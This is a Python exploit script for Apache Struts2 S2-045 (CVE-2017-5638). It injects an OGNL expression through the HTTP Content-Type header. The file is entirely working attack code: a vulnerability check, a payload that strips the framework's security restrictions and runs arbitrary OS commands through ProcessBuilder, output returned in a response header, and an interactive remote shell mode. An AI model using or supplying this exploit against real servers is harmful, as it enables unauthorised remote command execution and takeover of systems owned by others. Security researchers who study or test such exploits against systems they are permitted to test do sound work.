#!/usr/bin/env python3
"""
S2-045 (CVE-2017-5638) - Apache Struts2 Remote Code Execution
Client script to exploit the OGNL injection via Content-Type header.
"""

import argparse
import sys
import requests

requests.packages.urllib3.disable_warnings()


def check_target(target):
    try:
        r = requests.get("{}/".format(target), timeout=10, verify=False)
        print("[+] Target accessible (HTTP {})".format(r.status_code))
        return True
    except requests.exceptions.ConnectionError:
        print("[-] Could not connect to {}".format(target))
        return False


def check_vulnerability(target):
    print("\n[*] Checking for S2-045 vulnerability...")
    ognl = (
        "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
        ".addHeader('X-Vuln-Test',233*233)}.multipart/form-data"
    )
    headers = {"Content-Type": ognl, "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.post("{}/".format(target), headers=headers, data="", timeout=10, verify=False)
        vuln_header = r.headers.get("X-Vuln-Test", "")
        if vuln_header == "54289":
            print("[+] VULNERABLE! (233*233 = {})".format(vuln_header))
            return True
        else:
            print("[-] Target does not appear vulnerable.")
            return False
    except Exception as e:
        print("[-] Error: {}".format(e))
        return False


def exploit(target, command):
    ognl = (
        "%{(#_='multipart/form-data')."
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        "(#cmd='CMD')."
        "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds))."
        "(#p.redirectErrorStream(true))."
        "(#process=#p.start())."
        "(#reader=new java.util.Scanner(#process.getInputStream()).useDelimiter('\\\\A'))."
        "(#d=#reader.hasNext()?#reader.next().replaceAll('\\n',' | '):'')."
        "(#response=@org.apache.struts2.ServletActionContext@getResponse())."
        "(#response.addHeader('X-Cmd-Output', #d))}"
    ).replace("CMD", command)

    headers = {
        "Content-Type": ognl,
        "User-Agent": "Mozilla/5.0",
        "Connection": "close",
    }

    try:
        r = requests.post(
            "{}/".format(target),
            headers=headers,
            data="",
            timeout=15,
            verify=False,
        )

        output = r.headers.get("X-Cmd-Output")
        if output:
            print("[+] Command executed successfully!")
            print("[+] Output:\n{}".format(output.replace(' | ', '\n')))
            return output
        elif r.status_code == 200:
            print("[*] Command sent, but no output was returned in the header.")
        else:
            print("[*] Request sent (HTTP {})".format(r.status_code))
    except requests.exceptions.ConnectionError as e:
        print("[-] Connection failed: {}".format(e))
        return None


def interactive_shell(target):
    print("\n[*] Interactive shell mode. Type 'exit' to quit.")
    while True:
        try:
            cmd = input("shell> ").strip()
            if cmd.lower() == "exit":
                break
            if not cmd:
                continue
            exploit(target, cmd)
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break


def main():
    parser = argparse.ArgumentParser(description="S2-045 Header Exfiltration Exploit")
    parser.add_argument("target", help="Target URL")
    parser.add_argument("--cmd", default="id", help="Command to execute")
    parser.add_argument("--shell", action="store_true", help="Start interactive shell")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not check_target(target):
        sys.exit(1)

    if args.shell:
        if check_vulnerability(target):
            interactive_shell(target)
    else:
        exploit(target, args.cmd)


if __name__ == "__main__":
    main()
